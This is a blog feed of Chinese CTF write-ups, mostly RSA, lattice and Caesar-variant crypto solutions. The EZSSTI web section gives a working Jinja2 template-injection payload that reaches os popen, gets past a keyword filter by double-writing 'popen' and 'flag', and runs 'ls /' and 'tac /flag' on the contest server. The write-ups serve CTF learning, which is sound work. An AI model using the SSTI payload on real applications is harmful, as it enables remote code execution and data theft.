<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HSCSEC CTF 2023部分wp</title>
      <link href="/2023/02/13/HSCSEC%20CTF%202023%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/02/13/HSCSEC%20CTF%202023%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> m</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = m * e * <span class="number">1</span> * <span class="number">2022</span> * p</span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line"><span class="comment"># c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><blockquote><p>看到M = m * e * 1 * 2022 * p，又n = p*q，且$c{\equiv}M^e {\,}mod{\,} n$，故求n和c的公因数可以得到p，p出来就好解了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849</span></span><br><span class="line">c = <span class="number">12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411</span></span><br><span class="line">p = gcd(n, c)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = M // (e * <span class="number">2022</span> * p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator"></a>Operator</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&quot;*******************MASK****************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(FLAG)</span></span><br><span class="line">number1 = getPrime(<span class="number">512</span>)</span><br><span class="line">number2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(number1)</span><br><span class="line">result = FLAG * number1 % number2</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line"><span class="string">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>比较简单的格攻击</p><p>推导：</p><blockquote>$result{\equiv}m*number1 {\,}mod{\,} number2$ ——>  $m*number1=k*number2+result$ ——> $m*number1-result=k*number2$<p>构造二维格：</p>$\begin{pmatrix} 1 &number1 \\0&result \end{pmatrix} $<p>即$(m,-1)*\begin{pmatrix} 1 &number1 \\0&result \end{pmatrix}=(m, k*n)$</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">number1=<span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">result=<span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct lattice.</span></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, number1])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, result])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve SVP.</span></span><br><span class="line">shortest_vector = m.LLL()[<span class="number">0</span>]</span><br><span class="line">s, p = shortest_vector</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line"><span class="keyword">if</span> p &lt; <span class="number">0</span>:</span><br><span class="line">    p = -p</span><br><span class="line"></span><br><span class="line">FLAG=s</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(FLAG))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>注意：</p><p>它最后的输出结果p为0，也就是说k*n=0</p><p>那么k就为0，所以$m*number1=result$</p><p>所以直接整除即可，我搞复杂了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">number1=<span class="number">11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471</span></span><br><span class="line">result=<span class="number">1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771</span></span><br><span class="line">m=result//number1</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="EZVC"><a href="#EZVC" class="headerlink" title="EZVC"></a>EZVC</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#{%raw%}$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;HSC&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;HSCSEC&#123;&#x27;</span>)</span><br><span class="line">flag_num_list = []</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> flag:</span><br><span class="line">    flag_num_list.append(alphabet.find(item) + <span class="number">1</span>)</span><br><span class="line">key_num = alphabet.find(key) + <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    m = (i + key_num) % <span class="number">94</span> - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> m == <span class="number">0</span>:</span><br><span class="line">        c.append(<span class="string">&quot;□&quot;</span>)</span><br><span class="line">    c.append(alphabet[m-<span class="number">1</span>:m])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#x27;</span>.join(c)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|</span></span><br></pre></td></tr></table></figure><h3 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h3><blockquote><p>这题感觉是最简单的，但做出来的人确实三道crypto里最少的</p></blockquote><p>读了代码，关键是<code>m = (i + key_num) % 94 - 1</code>，但这里有很多是没用的</p><p>首先key_num为0，</p><p>其次<code>if m ==</code> 0:<code>         c.append(&quot;□&quot;)</code></p><p>我们可以看到密文里没有□，所以m也不会为0</p><p>最后alphabet一共就95个字符，后面那些字符也不会在flag里出现</p><p>所以</p><blockquote><p>m = (i + key_num) % 94 - 1 ——&gt; m = ( i ) % 94 - 1 ——&gt; m = ( i )  - 1</p></blockquote><p>将密文里的字符在alphabet的位数加一即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#${%endraw%}%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">c = <span class="string">&quot;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&quot;</span></span><br><span class="line">m=[]</span><br><span class="line">flag_num_list=[]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    j=alphabet.find(i)</span><br><span class="line">    m.append(j)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    j=i+<span class="number">1</span></span><br><span class="line">    flag_num_list.append(j)</span><br><span class="line"><span class="built_in">print</span>(flag_num_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_num_list:</span><br><span class="line">    flag.append(alphabet[i :i+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> flag:</span><br><span class="line">    l=l.strip(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    f+=l</span><br><span class="line"><span class="built_in">print</span>(f)</span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EZSSTI"><a href="#EZSSTI" class="headerlink" title="EZSSTI"></a>EZSSTI</h2><h3 id="解决方法-3"><a href="#解决方法-3" class="headerlink" title="解决方法"></a>解决方法</h3><p>ssti注入</p><p>存在popen函数的类一般是 <code>os._wrap_close</code></p><p>用下面的脚本寻找含有 os._wrap_close的索引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    url=<span class="string">&quot;http://f88d3905-30ed-4c30-bb3f-712ae41a7a45.race-node.hscsec.cn:8080/?name=&#123;&#123;[].__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span>%i</span><br><span class="line">    m=get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;m.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>索引号为132</p><p>注入过程中发现过滤了popen和flag，将其变为了空，双写即可绕过</p><p><strong><u>payload：</u></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[%27popopenpen%27](%27ls%20/%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/13/9d5545ba8ccd43ffab70c1085836adf8" alt="image-20230213130228111"></p><p>如上图所示，发现了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[%27popopenpen%27](%27tac%20/flflagag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/13/52c8dd0af1f345bcaf419e12915ed28a" alt="image-20230213130110863"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSS Crtpto题集一</title>
      <link href="/2023/02/10/NSS%20Crtpto%E9%A2%98%E9%9B%86%E4%B8%80/"/>
      <url>/2023/02/10/NSS%20Crtpto%E9%A2%98%E9%9B%86%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-2022-week2-RSA-Attack2"><a href="#HGAME-2022-week2-RSA-Attack2" class="headerlink" title="[HGAME 2022 week2]RSA Attack2"></a>[HGAME 2022 week2]RSA Attack2</h1><h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><blockquote><p>task1：共享素数</p><p>task2：小明文攻击，直接开根</p><p>task3：共模攻击</p></blockquote><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#task1</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</span></span><br><span class="line">c1 = <span class="number">965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</span></span><br><span class="line">n2 = <span class="number">20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</span></span><br><span class="line">c2 = <span class="number">11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</span></span><br><span class="line">q1 = gcd(n1,n2)</span><br><span class="line">p1 = n1 // q1</span><br><span class="line">d1 = invert(e1,(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#task2</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">n3 = <span class="number">14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</span></span><br><span class="line">c3 = <span class="number">10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</span></span><br><span class="line">m2 = iroot(c3,e2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#task3</span></span><br><span class="line">n4 = <span class="number">18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</span></span><br><span class="line">e3 = <span class="number">2519901323</span></span><br><span class="line">c4 = <span class="number">3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870</span></span><br><span class="line">e4 = <span class="number">3676335737</span></span><br><span class="line">c5 = <span class="number">940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861</span></span><br><span class="line"><span class="comment"># 扩展欧几里得算法求出s1,s2的值，满足e1*s1 + e2*s2 = 1</span></span><br><span class="line">_,s1,s2 = gcdext(e3,e4)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c4,s1,n4) * <span class="built_in">pow</span>(c5,s2,n4) % n4</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3))</span><br></pre></td></tr></table></figure><h1 id="NISACTF-2022-funnycaeser"><a href="#NISACTF-2022-funnycaeser" class="headerlink" title="[NISACTF 2022]funnycaeser"></a>[NISACTF 2022]funnycaeser</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>题目描述：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">凯撒5号说：大家为什么都说我很奇怪？</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NRQ;P&lt;uLliW^(XQ/QT\NDh</span><br></pre></td></tr></table></figure><h2 id="关键词-1"><a href="#关键词-1" class="headerlink" title="关键词"></a>关键词</h2><blockquote><p>变异凯撒   ascill</p></blockquote><h2 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h2><p>实验吧有一道关于变异凯撒的题目，就是第一个字符的ascill向后移了5,第二个向后移了6,第三个向后移了7,以此类推,很容易想到变异凯撒即每个向后移的位数是前一个加1</p><p>而本题有些类似，描述上是</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">凯撒5号说：大家为什么都说我很奇怪？</span><br></pre></td></tr></table></figure></blockquote><p>所以我们可以先以5为key进行凯撒密码的解密，得到：<code>IML;K&lt;pGgdR^(SL/LO\Iyc</code>，</p><p>然后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="string">r&quot;IML;K&lt;pGgdR^(SL/LO\IYc&quot;</span></span><br><span class="line">j = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    j += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到：<code>NSSCTF&#123;Stran9e_Caesar&#125;</code></p><h1 id="黑盾杯-2020-Round"><a href="#黑盾杯-2020-Round" class="headerlink" title="[黑盾杯 2020]Round"></a>[黑盾杯 2020]Round</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NRQ;P&lt;uLliW^(XQ/QT\NDh</span><br></pre></td></tr></table></figure><h2 id="关键词-2"><a href="#关键词-2" class="headerlink" title="关键词"></a>关键词</h2><blockquote><p>变异凯撒</p></blockquote><h2 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h2><p>出现特殊字符，可能是变异凯撒，与上一题相比，不在改变j</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ciphertext = <span class="string">&quot;:D@J::K=r&lt;ecXi^\[V:X\jXit&quot;</span></span><br><span class="line">j=<span class="number">9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ciphertext:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
          <category> 笔记 </category>
          
          <category> 题集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
            <tag> 题集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 7 Team crypto篇部分wp</title>
      <link href="/2023/02/07/NSSRound%207%20Team%20crypto%E7%AF%87%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/02/07/NSSRound%207%20Team%20crypto%E7%AF%87%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="裁雨留虹"><a href="#裁雨留虹" class="headerlink" title="裁雨留虹"></a>裁雨留虹</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p ^ 